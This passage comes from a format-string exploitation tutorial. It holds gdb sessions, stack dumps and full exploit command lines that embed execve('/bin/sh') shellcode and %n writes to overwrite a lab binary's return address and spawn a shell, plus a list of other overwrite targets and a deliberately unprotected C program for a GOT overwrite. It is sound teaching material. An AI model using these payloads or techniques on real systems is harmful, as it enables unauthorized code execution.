Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%53181u" + "%6$n"')
��������1�Ph//shh/bin��PS��

Breakpoint 1, 0x0804921c in main ()

gef➤  x/100wx $esp - 0xfc
0xffffcec0:	0xffffced8	0xffffd270	0x000000c8	0x080491d4
0xffffced0:	0x00000000	0x00000000	0xffffcfbc	0xffffcfbe
0xffffcee0:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xffffcef0:	0xb0e18953	0x2580cd0b	0x32393235	0x36257539
0xffffcf00:	0x00007824	0x00000000	0x00000000	0x00000000
0xffffcf10:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf20:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf30:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf40:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf50:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf60:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf70:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf80:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf90:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfa0:	0xffffcfc0	0x00000000	0x00000000	0xf7ddbee5
0xffffcfb0:	0xf7fa8000	0xf7fa8000	0x00000000	0xf7ddbee5
0xffffcfc0:	0x00000002	0xffffd054	0xffffd060	0xffffcfe4
0xffffcfd0:	0xf7fa8000	0x00000000	0xffffd038	0x00000000
0xffffcfe0:	0xf7ffd000	0x00000000	0xf7fa8000	0xf7fa8000
0xffffcff0:	0x00000000	0xee02ebb1	0xaae02da1	0x00000000
0xffffd000:	0x00000000	0x00000000	0x00000002	0x080490a0
0xffffd010:	0x00000000	0xf7fe7cd4	0xf7fe2410	0x0804c000
0xffffd020:	0x00000002	0x080490a0	0x00000000	0x080490d6
0xffffd030:	0x080491b6	0x00000002	0xffffd054	0x08049220
0xffffd040:	0x08049290	0xf7fe2410	0xffffd04c	0x0000001c
gef➤  
```

Also, the saved return address changed its place in the stack. Now it is at `0xffffcfbc`. And the shellcode changed its place too. It is at `0xffffcee0`.

Okay, write first 2 bytes.
```bash
gef➤  r $(python -c 'print "\xbc\xcf\xff\xff" + "\xbe\xcf\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%52929u" + "%6$n"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xbc\xcf\xff\xff" + "\xbe\xcf\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%52929u" + "%6$n"')
��������1�Ph//shh/bin��PS��

gef➤  x/100wx $esp - 0xfc
0xffffcec0:	0xffffced8	0xffffd270	0x000000c8	0x080491d4
0xffffced0:	0x00000000	0x00000000	0xffffcfbc	0xffffcfbe
0xffffcee0:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xffffcef0:	0xb0e18953	0x2580cd0b	0x32393235	0x36257539
0xffffcf00:	0x00006e24	0x00000000	0x00000000	0x00000000
0xffffcf10:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf20:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf30:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf40:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf50:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf60:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf70:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf80:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf90:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfa0:	0xffffcfc0	0x00000000	0x00000000	0xf7ddbee5
0xffffcfb0:	0xf7fa8000	0xf7fa8000	0x00000000	0x0000cee0
0xffffcfc0:	0x00000002	0xffffd054	0xffffd060	0xffffcfe4
0xffffcfd0:	0xf7fa8000	0x00000000	0xffffd038	0x00000000
0xffffcfe0:	0xf7ffd000	0x00000000	0xf7fa8000	0xf7fa8000
0xffffcff0:	0x00000000	0xcd183db2	0x89fafba2	0x00000000
0xffffd000:	0x00000000	0x00000000	0x00000002	0x080490a0
0xffffd010:	0x00000000	0xf7fe7cd4	0xf7fe2410	0x0804c000
0xffffd020:	0x00000002	0x080490a0	0x00000000	0x080490d6
0xffffd030:	0x080491b6	0x00000002	0xffffd054	0x08049220
0xffffd040:	0x08049290	0xf7fe2410	0xffffd04c	0x0000001c
gef➤  
```

Next, 2 bytes.
```bash
>>> 0xffff - 0xcee0
12575
>>>
```

```bash
gef➤  r $(python -c 'print "\xbc\xcf\xff\xff" + "\xbe\xcf\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%52929u" + "%6$n" + "%12575u" + "%7$n"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xbc\xcf\xff\xff" + "\xbe\xcf\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%52929u" + "%6$n" + "%12575u" + "%7$n"')
��������1�Ph//shh/bin��PS��

gef➤  x/100wx $esp - 0xfc
0xffffcec0:	0xffffced8	0xffffd265	0x000000c8	0x080491d4
0xffffced0:	0x00000000	0x00000000	0xffffcfbc	0xffffcfbe
0xffffcee0:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xffffcef0:	0xb0e18953	0x2580cd0b	0x32393235	0x36257539
0xffffcf00:	0x31256e24	0x35373532	0x24372575	0x0000006e
0xffffcf10:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf20:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf30:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf40:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf50:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf60:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf70:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf80:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf90:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfa0:	0xffffcfc0	0x00000000	0x00000000	0xf7ddbee5
0xffffcfb0:	0xf7fa8000	0xf7fa8000	0x00000000	0xffffcee0
0xffffcfc0:	0x00000000	0xffffd054	0xffffd060	0xffffcfe4
0xffffcfd0:	0xf7fa8000	0x00000000	0xffffd038	0x00000000
0xffffcfe0:	0xf7ffd000	0x00000000	0xf7fa8000	0xf7fa8000
0xffffcff0:	0x00000000	0x748c3291	0x306ef481	0x00000000
0xffffd000:	0x00000000	0x00000000	0x00000002	0x080490a0
0xffffd010:	0x00000000	0xf7fe7cd4	0xf7fe2410	0x0804c000
0xffffd020:	0x00000002	0x080490a0	0x00000000	0x080490d6
0xffffd030:	0x080491b6	0x00000002	0xffffd054	0x08049220
0xffffd040:	0x08049290	0xf7fe2410	0xffffd04c	0x0000001c
gef➤  
```

You can see that the shellcode address was written. BUT, for me, it doesn't work. So, now, I'm trying to solve the problem: the program jumps to shellcode but doesn't execute it properly...

Okay, I solved it. The problem was in shellcode. It stops working :) So, I just took [another one](http://shell-storm.org/shellcode/files/shellcode-585.php "http://shell-storm.org/shellcode/files/shellcode-585.php") from the [shellcode database](http://shell-storm.org/shellcode/ "http://shell-storm.org/shellcode/").

Here, you need to do the same calculations that were above, but the shellcode will be after format string things.

```bash
gef➤  r $(python -c 'print "\xac\xcf\xff\xff" + "\xae\xcf\xff\xff" + "%52958u" + "%6$n" + "%12569u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xac\xcf\xff\xff" + "\xae\xcf\xff\xff" + "%52958u" + "%6$n" + "%12569u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
��������

Breakpoint 1, 0x0804921c in main ()

gef➤  x/106wx $esp - 0x100
0xffffceac:	0x0804920b	0xffffcec8	0xffffd263	0x000000c8
0xffffcebc:	0x080491d4	0x00000000	0x00000000	0xffffcfac
0xffffcecc:	0xffffcfae	0x39323525	0x25753835	0x256e2436
0xffffcedc:	0x36353231	0x37257539	0x0beb6e24	0x31c0315b
0xffffceec:	0xb0d231c9	0xe880cd0b	0xfffffff0	0x6e69622f
0xffffcefc:	0x0068732f	0x00000000	0x00000000	0x00000000
0xffffcf0c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf1c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf2c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf3c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf4c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf5c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf6c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf7c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf8c:	0x00000000	0xffffcfb0	0x00000000	0x00000000
0xffffcf9c:	0xf7ddbee5	0xf7fa8000	0xf7fa8000	0x00000000
0xffffcfac:	0xffffcee6	0x00000000	0xffffd044	0xffffd050
0xffffcfbc:	0xffffcfd4	0xf7fa8000	0x00000000	0xffffd028
0xffffcfcc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffcfdc:	0xf7fa8000	0x00000000	0xeafeb5a5	0xae1c93b5
0xffffcfec:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffcffc:	0x080490a0	0x00000000	0xf7fe7cd4	0xf7fe2410
0xffffd00c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd01c:	0x080490d6	0x080491b6	0x00000002	0xffffd044
0xffffd02c:	0x08049220	0x08049290	0xf7fe2410	0xffffd03c
0xffffd03c:	0x0000001c	0x00000002	0xffffd21e	0xffffd263
0xffffd04c:	0x00000000	0xffffd29b
gef➤  
```

The return address is at `0xffffcfac` and the shellcode is at `0xffffcee6`. Next, continue the execution.

```bash
gef➤  c
Continuing.
process 16431 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$ w
[Detaching after fork from child process 16481]
 11:18:42 up  3:02,  1 user,  load average: 0.70, 0.54, 0.37
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shogun   tty7     :0               08:16    3:02m  9:01   4.18s xfce4-session
$
```

Again, there is a problem that this exploit doesn't work outside gdb. Correct it. Use `unset environment LINES`, `unset environment COLUMNS`.

```bash
gef➤  unset environment LINES
gef➤  unset environment COLUMNS
gef➤  b *main + 102
Breakpoint 1 at 0x804921c

gef➤  r $(python -c 'print "\xac\xcf\xff\xff" + "\xae\xcf\xff\xff" + "%52958u" + "%6$n" + "%12569u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xac\xcf\xff\xff" + "\xae\xcf\xff\xff" + "%52958u" + "%6$n" + "%12569u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
��������

gef➤  x/106wx $esp - 0x100
0xffffcedc:	0x0804920b	0xffffcef8	0xffffd278	0x000000c8
0xffffceec:	0x080491d4	0x00000000	0x00000000	0xffffcfac
0xffffcefc:	0xffffcfae	0x39323525	0x25753835	0x256e2436
0xffffcf0c:	0x36353231	0x37257539	0x0beb6e24	0x31c0315b
0xffffcf1c:	0xb0d231c9	0xe880cd0b	0xfffffff0	0x6e69622f
0xffffcf2c:	0x0068732f	0x00000000	0x00000000	0x00000000
0xffffcf3c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf4c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf5c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf6c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf7c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf8c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf9c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfac:	0xffffcee6	0x00000000	0x00000000	0x00000000
0xffffcfbc:	0x00000000	0xffffcfe0	0x00000000	0x00000000
0xffffcfcc:	0xf7ddbee5	0xf7fa8000	0xf7fa8000	0x00000000
0xffffcfdc:	0xf7ddbee5	0x00000002	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0x6653c629	0x22b14039
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7cd4	0xf7fe2410
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe2410	0xffffd06c
0xffffd06c:	0x0000001c	0x00000002	0xffffd233	0xffffd278
0xffffd07c:	0x00000000	0xffffd2b0
gef➤  
```

The addresses changed again. `CHANGE IT AGAIN :D`.
```bash
gef➤  x/106wx $esp - 0x106
0xffffced6:	0x1349f7ff	0x920bf7e1	0xcef80804	0xd278ffff
0xffffcee6:	0x00c8ffff	0x91d40000	0x00000804	0x00000000
0xffffcef6:	0xcfdc0000	0xcfdeffff	0x3525ffff	0x38353932
0xffffcf06:	0x24362575	0x3231256e	0x75393635	0x6e243725
0xffffcf16:	0x315b0beb	0x31c931c0	0xcd0bb0d2	0xfff0e880
0xffffcf26:	0x622fffff	0x732f6e69	0x00000068	0x00000000
0xffffcf36:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf46:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf56:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf66:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf76:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf86:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf96:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfa6:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfb6:	0x00000000	0x00000000	0xcfe00000	0x0000ffff
0xffffcfc6:	0x00000000	0xbee50000	0x8000f7dd	0x8000f7fa
0xffffcfd6:	0x0000f7fa	0xcee60000	0x0000ffff	0xd0740000
0xffffcfe6:	0xd080ffff	0xd004ffff	0x8000ffff	0x0000f7fa
0xffffcff6:	0xd0580000	0x0000ffff	0xd0000000	0x0000f7ff
0xffffd006:	0x80000000	0x8000f7fa	0x0000f7fa	0x30dc0000
0xffffd016:	0xb6cc2b06	0x00006fe4	0x00000000	0x00000000
0xffffd026:	0x00020000	0x90a00000	0x00000804	0x7cd40000
0xffffd036:	0x2410f7fe	0xc000f7fe	0x00020804	0x90a00000
0xffffd046:	0x00000804	0x90d60000	0x91b60804	0x00020804
0xffffd056:	0xd0740000	0x9220ffff	0x92900804	0x24100804
0xffffd066:	0xd06cf7fe	0x001cffff	0x00020000	0xd2330000
0xffffd076:	0xd278ffff	0x0000ffff
```

The shellcode now is at `0xffffcf16`. How can I determine where the shellcode starts? By the start of the shellcode! `\xeb\x0b\x5b\x31` is `0x315b0beb` which showed above.

```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%53006u" + "%6$n" + "%12569u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%53006u" + "%6$n" + "%12569u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
��������
gef➤  x/106wx $esp - 0x100
0xffffcedc:	0x0804920b	0xffffcef8	0xffffd278	0x000000c8
0xffffceec:	0x080491d4	0x00000000	0x00000000	0xffffcfdc
0xffffcefc:	0xffffcfde	0x30333525	0x25753630	0x256e2436
0xffffcf0c:	0x36353231	0x37257539	0x0beb6e24	0x31c0315b
0xffffcf1c:	0xb0d231c9	0xe880cd0b	0xfffffff0	0x6e69622f
0xffffcf2c:	0x0068732f	0x00000000	0x00000000	0x00000000
0xffffcf3c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf4c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf5c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf6c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf7c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf8c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf9c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfac:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfbc:	0x00000000	0xffffcfe0	0x00000000	0x00000000
0xffffcfcc:	0xf7ddbee5	0xf7fa8000	0xf7fa8000	0x00000000
0xffffcfdc:	0x002fcf16	0x00000001	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0x670fce9e	0x23ed488e
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7cd4	0xf7fe2410
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe2410	0xffffd06c
0xffffd06c:	0x0000001c	0x00000002	0xffffd233	0xffffd278
0xffffd07c:	0x00000000	0xffffd2b0
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%53006u" + "%6$n" + "%12521u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%53006u" + "%6$n" + "%12521u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
��������
gef➤  x/106wx $esp - 0x100
0xffffcedc:	0x0804920b	0xffffcef8	0xffffd278	0x000000c8
0xffffceec:	0x080491d4	0x00000000	0x00000000	0xffffcfdc
0xffffcefc:	0xffffcfde	0x30333525	0x25753630	0x256e2436
0xffffcf0c:	0x32353231	0x37257531	0x0beb6e24	0x31c0315b
0xffffcf1c:	0xb0d231c9	0xe880cd0b	0xfffffff0	0x6e69622f
0xffffcf2c:	0x0068732f	0x00000000	0x00000000	0x00000000
0xffffcf3c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf4c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf5c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf6c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf7c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf8c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf9c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfac:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfbc:	0x00000000	0xffffcfe0	0x00000000	0x00000000
0xffffcfcc:	0xf7ddbee5	0xf7fa8000	0xf7fa8000	0x00000000
0xffffcfdc:	0xffffcf16	0x00000000	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0x2410c591	0x60f24381
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7cd4	0xf7fe2410
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe2410	0xffffd06c
0xffffd06c:	0x0000001c	0x00000002	0xffffd233	0xffffd278
0xffffd07c:	0x00000000	0xffffd2b0
gef➤  c
Continuing.
process 16724 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$ whoami
[Detaching after fork from child process 16727]
shogun
$
```

OK. Trying it outside. It doesn't work again. Okay, let's try `ltrace` tool which shows you the library functions execution.

~~~bash
$ ltrace ./format-string $(python -c 'print "\xfc\xcf\xff\xff" + "\xfe\xcf\xff\xff" + "%53038u" + "%6$n" + "%12489u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
__libc_start_main(0x80491b6, 2, 0xffffd104, 0x8049220 <unfinished ...>
strncpy(0xffffcf68, "\374\317\377\377\376\317\377\377%53038u%6$n%12489u%7$n\353\v"..., 200)                                                        = 0xffffcf88
printf("\374\317\377\377\376\317\377\377%53038u%6$n%12489u%7$n\353\v"..., 4294955730, 0xc8, 134517204, 0��������
~~~

It shows that the input string is placed at `0xffffcf68`. So, it says that the string is copied to this address. Let's determine this address inside gdb and next calculate the offset.

~~~bash
gef➤  unset environment LINES
gef➤  unset environment COLUMNS
gef➤  disas main
Dump of assembler code for function main:
   0x080491b6 <+0>:	endbr32
   0x080491ba <+4>:	lea    ecx,[esp+0x4]
   0x080491be <+8>:	and    esp,0xfffffff0
   0x080491c1 <+11>:	push   DWORD PTR [ecx-0x4]
   0x080491c4 <+14>:	push   ebp
   0x080491c5 <+15>:	mov    ebp,esp
   0x080491c7 <+17>:	push   ebx
   0x080491c8 <+18>:	push   ecx
   0x080491c9 <+19>:	sub    esp,0xd0
   0x080491cf <+25>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x080491d4 <+30>:	add    ebx,0x2e2c
   0x080491da <+36>:	mov    eax,ecx
   0x080491dc <+38>:	mov    eax,DWORD PTR [eax+0x4]
   0x080491df <+41>:	add    eax,0x4
   0x080491e2 <+44>:	mov    eax,DWORD PTR [eax]
   0x080491e4 <+46>:	sub    esp,0x4
   0x080491e7 <+49>:	push   0xc8
   0x080491ec <+54>:	push   eax
   0x080491ed <+55>:	lea    eax,[ebp-0xd0]
   0x080491f3 <+61>:	push   eax
   0x080491f4 <+62>:	call   0x8049090 <strncpy@plt>
   0x080491f9 <+67>:	add    esp,0x10
   0x080491fc <+70>:	sub    esp,0xc
   0x080491ff <+73>:	lea    eax,[ebp-0xd0]
   0x08049205 <+79>:	push   eax
   0x08049206 <+80>:	call   0x8049070 <printf@plt>
   0x0804920b <+85>:	add    esp,0x10
   0x0804920e <+88>:	mov    eax,0x0
   0x08049213 <+93>:	lea    esp,[ebp-0x8]
   0x08049216 <+96>:	pop    ecx
   0x08049217 <+97>:	pop    ebx
   0x08049218 <+98>:	pop    ebp
   0x08049219 <+99>:	lea    esp,[ecx-0x4]
   0x0804921c <+102>:	ret    
End of assembler dump.
ef➤  b *main + 67
Breakpoint 1 at 0x80491f9
gef➤  r $(python -c 'print "\xec\xcf\xff\xff" + "\xee\xcf\xff\xff" + "%53024u" + "%6$n" + "%12503u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xec\xcf\xff\xff" + "\xee\xcf\xff\xff" + "%53024u" + "%6$n" + "%12503u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')

Breakpoint 1, 0x080491f9 in main ()

gef➤  x/100wx $esp - 0x100
0xffffcdf0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffce00:	0x00000000	0x00000000	0xf7ffd000	0x00000000
0xffffce10:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffce20:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffce30:	0x00000000	0xffffffff	0x00000000	0xf7dc658c
0xffffce40:	0xf7fcb110	0x00000000	0xffffce4c	0x00000000
0xffffce50:	0x00000000	0x00000240	0x00000340	0x00000380
0xffffce60:	0x00000380	0x00000001	0x00000000	0x080482c2
0xffffce70:	0x0804c014	0xf7fe19ae	0x080482c2	0xf7ffd980
0xffffce80:	0xffffceb4	0xf7ffdb40	0xf7fcb410	0x00000001
0xffffce90:	0xf7e48259	0xf7fe1a0a	0xf7dc46e8	0xf7fcb410
0xffffcea0:	0xf7ffd000	0x080482a8	0x00000001	0x00000001
0xffffceb0:	0xf7dcdedc	0xf7dc658c	0xf7dce76c	0xf7fcb110
0xffffcec0:	0xffffcf14	0x0804c000	0xf7fa8000	0xf7fa8000
0xffffced0:	0xffffcfd8	0xf7fe7cd4	0xffffd014	0xf7e595ce
0xffffcee0:	0xf7fa8000	0xf7fa8000	0x0804c000	0x080491f9
0xffffcef0:	0xffffcf08	0xffffd28c	0x000000c8	0x080491d4
0xffffcf00:	0x00000000	0x00000000	0xffffcfec	0xffffcfee
0xffffcf10:	0x30333525	0x25753432	0x256e2436	0x30353231
0xffffcf20:	0x37257533	0x0beb6e24	0x31c0315b	0xb0d231c9
0xffffcf30:	0xe880cd0b	0xfffffff0	0x6e69622f	0x0068732f
0xffffcf40:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf50:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf60:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf70:	0x00000000	0x00000000	0x00000000	0x00000000
gef➤  
~~~

You can see that the address where the strncpy function placed our input string is `0xffffcf08`. Thus, you need to determine the offset and do all calculations for the exploit. I just show you my final exploit.

~~~bash
shogun@kyoto:~/repos/basics-of-pwn/content/format-string$ ./format-string $(python -c 'print "\x4c\xd0\xff\xff" + "\x4e\xd0\xff\xff" + "%53120u" + "%6$n" + "%12407u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
L���N���

=========================
The long empty output here...
=========================

200�$ w
 11:30:04 up 37 min,  1 user,  load average: 0.42, 0.39, 0.35
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shogun   tty7     :0               10:53   37:01   1:42   1.25s xfce4-session
$
~~~

Okay, you can say that if we wouldn't have a ltrace tool then we couldn't exploit the vulnerability. It is not true. Don't forget about brute-force attack and pwntools. With some brute-force script that will do all calculations and execute the exploit sooner or later, you will get a shell.

## What else can you overwrite with a format string

With the format string, you will discover many ways of exploitation.

Format string variants of exploitation:

1. Overwrite the saved return address.
2. Overwrite another application-specific function pointer.
3. Overwrite a pointer to an exception handler, then cause an exception.
4. Overwrite a GOT entry.
5. Overwrite the atexit handler.
6. Overwrite entries in the DTORS section.
7. Turn a format string bug into a stack or heap overflow by overwriting a null terminator with non-null data.
8. Write application-specific data such as stored UID or GID values with values of your choice.
9. Modify strings containing commands to reflect commands of your choice.

I will show here, how to overwrite a GOT entry.

Consider the program:
```C
#include <stdio.h>
#include <string.h>

// gcc got-overwrite.c -o got-overwrite -fno-stack-protector -no-pie -z execstack -Wl,-z,norelro -m32


int main(int argc, char *argv[]){
  char buff[200];
  strncpy(buff, argv[1], 200);
  printf(buff);
  char buff2[200];
  gets(buff2);
  printf(buff2);
  return 0;
}
```

You can see GOT table:
```bash
$ objdump -R got-overwrite

got-overwrite:     file format elf32-i386

